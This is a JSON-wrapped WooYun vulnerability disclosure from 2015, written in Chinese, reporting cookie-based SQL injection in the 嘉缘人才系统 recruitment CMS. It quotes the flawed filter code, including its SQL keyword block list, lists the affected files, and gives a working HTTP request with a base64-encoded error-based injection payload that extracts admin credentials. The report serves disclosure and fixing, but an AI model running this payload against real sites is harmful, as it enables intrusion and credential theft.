{"id": 36485, "wybug_id": "wooyun-2015-0101750", "wybug_title": "嘉缘人才系统多处sql注入打包", "wybug_corp": "finereason.com", "wybug_author": "牛肉包子", "wybug_date": "2015-03-17 16:40", "wybug_open_date": "2015-06-18 14:42", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-17：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-20：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-03-23：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-05-14：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-05-24：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-03：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-06-18：\t细节向公众公开  简要描述： 一次性全部打包，希望厂商重视这个问题，做好过滤。 详细说明：  这套cms存在一个很大隐患就是对于cookie的过滤。根据这个cms给出的函数可以写一个dome\n<?phperror_reporting(0);foreach($_REQUEST as $_k=>$_v){ \tif( strlen($_k)>0 && preg_match('/^(cfg|GLOBALS)/i',$_k) ){\t\texit('Request var not allow!');\t}}foreach(Array('_GET','_POST','_COOKIE') as $_request){\tforeach($$_request as $_k => $_v) $_k{0} != '_' && ${$_k} = is_array($_v)?_runmagicquotes($_v):cleartags(_runmagicquotes($_v));    //foreach($$_request as $_k => $_v) ${$_k} = _runmagicquotes($_v);}function _runmagicquotes(&$svar){\tif(!get_magic_quotes_gpc()){\t\tif( is_array($svar) ){\t\t\tforeach($svar as $_k => $_v) $svar[$_k] = _runmagicquotes($_v);\t\t}else{\t\t\t$svar = addslashes($svar);\t\t}\t}\treturn $svar;}function cleartags($msg){    if(!$msg) return '';    $msg=stripslashes($msg);    $msg=strip_tags($msg);    $msg=dhtmlspecialchars($msg);    return trim(addslashes($msg));}function dhtmlspecialchars($string) {    if(is_array($string)) {        foreach($string as $key => $val) {            $string[$key] = dhtmlspecialchars($val);        }    }else{        $string = str_replace(array('&', '\"', '<', '>'),array('&amp;', '&quot;', '&lt;', '&gt;'), $string);        if(strpos($string, '&#') !== false) {            $string = preg_replace('/&((#(\\d{3,5}|x[a-fA-F0-9]{4}));)/','&\\\\1', $string);        }    }    return $string;}function checksql($dbstr,$querytype='select'){\t$clean = '';\t$old_pos = 0;\t$pos = -1;\t//普通语句，直接过滤特殊语法\tif($querytype=='select'){\t\t$nastr = \"/[^0-9a-z@\\._-]{1,}(union|sleep|benchmark|load_file|outfile)[^0-9a-z@\\.-]{1,}/i\";\t\tif(preg_match($nastr,$dbstr)){            log_write($dbstr,'sql');            showmsg('SafeError:10001', 'javascript:;');            exit();\t\t}\t}\t//完整的SQL检查\twhile (true){\t\t$pos = strpos($dbstr, '\\'', $pos + 1);\t\tif ($pos === false){\t\t\tbreak;\t\t}\t\t$clean .= substr($dbstr, $old_pos, $pos - $old_pos);\t\twhile (true){\t\t\t$pos1 = strpos($dbstr, '\\'', $pos + 1);\t\t\t$pos2 = strpos($dbstr, '\\\\', $pos + 1);\t\t\tif ($pos1 === false){\t\t\t\tbreak;\t\t\t}\t\t\telseif ($pos2 == false || $pos2 > $pos1){\t\t\t\t$pos = $pos1;\t\t\t\tbreak;\t\t\t}\t\t\t$pos = $pos2 + 1;\t\t}\t\t$clean .= '$s$';\t\t$old_pos = $pos + 1;\t}\t$clean .= substr($dbstr, $old_pos);\t$clean = trim(strtolower(preg_replace(array('~\\s+~s' ), array(' '), $clean)));\tif (strpos($clean, 'union') !== false && preg_match('~(^|[^a-z])union($|[^[a-z])~s', $clean) != 0){\t\t\t\t$fail = true;\t\techo \"aaaaaaa\";\t}\telseif (strpos($clean, '/*') > 2 || strpos($clean, '--') !== false || strpos($clean, '#') !== false){\t\t$fail = true;\t\techo \"bbbbbbb\";\t}\telseif (strpos($clean, 'sleep') !== false && preg_match('~(^|[^a-z])sleep($|[^[a-z])~s', $clean) != 0){\t\t$fail = true;\t\techo \"ccccccc\";\t}\telseif (strpos($clean, 'benchmark') !== false && preg_match('~(^|[^a-z])benchmark($|[^[a-z])~s', $clean) != 0){\t\t$fail = true;\t\techo \"ddddddd\";\t}\telseif (strpos($clean, 'load_file') !== false && preg_match('~(^|[^a-z])load_file($|[^[a-z])~s', $clean) != 0){\t\t$fail = true;\t\techo \"eeeeeee\";\t}\telseif (strpos($clean, 'into outfile') !== false && preg_match('~(^|[^a-z])into\\s+outfile($|[^[a-z])~s', $clean) != 0){\t\t$fail = true;\t\techo \"fffffff\";\t}\telseif (preg_match('~\\([^)]*?select~s', $clean) != 0){\t\t$fail = true;\t\techo \"ggggggg\";\t}\tif (!empty($fail)){        //log_write($dbstr,'sql');        echo \"SafeError:10002\";exit;\t}\telse\t{\t\treturn $dbstr;\t}}$word = $_COOKIE['word'];echo $word;?>\n我们来测试对于cookie的过滤。可以看到直接引入单引号\n\ncms中获取cookie的函数是这样写的，其实最终效果和demo一样\nfunction _getcookie($var) {\tglobal $cfg;\t$var = $cfg['cookie_pre'].$var;\treturn isset($_COOKIE[$var]) ? substr(base64_decode($_COOKIE[$var]),0,-strlen($cfg['cookie_encode'])) : '';}\n然后我们在整个cms中搜索一下这个函数\n\n其中 WooYun: 嘉缘人才系统SQL注入漏洞  WooYun: 嘉缘人才系统SQL注入可获取任意数据#1 提交过这个cookie的问题，但是厂商是怎样做的呢？就对于上面两个文件加上了cleartags这个函数，其他的就不管了。除了这两处，还存在12处。都存在这个cookie注入问题。在\\inc\\attention.php\nrequire(dirname(__FILE__).'/../config.inc.php');if(empty($do)) $do= '';$db=connectdb();$mid=intval($mid);if($do==\"addatten\"&&$mid){    $username=_getcookie('user_login');    if($username==''){        echo 'nologin';exit();    }else{        $rs = $db->get_one(\"select m_id,m_flag,m_name,m_typeid from {$cfg['tb_pre']}member where m_login='$username' limit 1\");\n在\\inc\\concat.php\nrequire(dirname(__FILE__).'/../config.inc.php');$db=connectdb();$username=_getcookie('user_login');$usertype=_getcookie('user_type');require_once(FR_ROOT.'/inc/paylog.inc.php');//取权限$Glimit=$Gintegral=Array(0,0,0,0,0,0,0,0,0,0,0,0,0);if($username!=''){    $rs = $db->get_one(\"select m_id,m_name,m_flag,DATEDIFF(m_enddate,'\".date('Y-m-d').\"') as end,m_limit,g_limit,g_integral from {$cfg['tb_pre']}member INNER JOIN {$cfg['tb_pre']}group on m_groupid=g_id where m_login='$username' limit 0,1\");\n在\\inc\\do_ajax_file_upload.php\n<?phprequire_once(dirname(__FILE__).'/../config.inc.php');!isset($db)&&$db=connectdb();$username=_getcookie('user_login');if($username!=''){    $userpass=_getcookie('user_pass');    $rs = $db->get_one(\"select m_id from {$cfg['tb_pre']}member where m_login='$username' and m_pwd='$userpass' limit 1\");}\n以及member\\course_list.phpmember\\department_list.phpmember\\professor.phpmember\\studnet_list.php等等地方都存在这个注入。对于漏洞的利用方式 WooYun: 嘉缘人才系统SQL注入漏洞  WooYun: 嘉缘人才系统SQL注入可获取任意数据#1 这两个提供了，盲注的方法。根据我前面提交过的漏洞，还可以通过报错注入直接出数据。我以\\inc\\do_ajax_file_upload.php为例\nGET /frcms/inc/do_ajax_file_upload.php HTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateCookie: fr_user_login=ZnVja1NnWlFkMzMwNVY%3D; X-Forwarded-For: 8.8.8.8Connection: keep-alive\n将base64解密\nfuckSgZQd3305V\nfuck为我们可控，我们构造\nfuck' or char(@`'`) or (SELECT 1 FROM(SELECT count(*),concat((SELECT(SELECT concat(a_user,0x27,a_pass)) FROM job_admin limit 0,1),floor(rand(0)*2))x FROM information_schema.columns group by x)a)#SgZQd3305V\n然后base64一次\nZnVjaycgb3IgY2hhcihAYCdgKSBvciAoU0VMRUNUIDEgRlJPTShTRUxFQ1QgY291bnQoKiksY29uY2F0KChTRUxFQ1QoU0VMRUNUIGNvbmNhdChhX3VzZXIsMHgyNyxhX3Bhc3MpKSBGUk9NIGpvYl9hZG1pbiBsaW1pdCAwLDEpLGZsb29yKHJhbmQoMCkqMikpeCBGUk9NIGluZm9ybWF0aW9uX3NjaGVtYS5jb2x1bW5zIGdyb3VwIGJ5IHgpYSkjU2daUWQzMzA1Vg==\n提交，mysql报错\n\n然后访问日志记录文件\n\n   漏洞证明：  \n\n   修复方案：  漏洞不能指哪里，补哪里。   版权声明：转载请注明来源 牛肉包子@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-03-20 14:40 厂商回复： 前边有两个是因为最近没有登录这个平台，系统自动忽略了，感谢提交。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}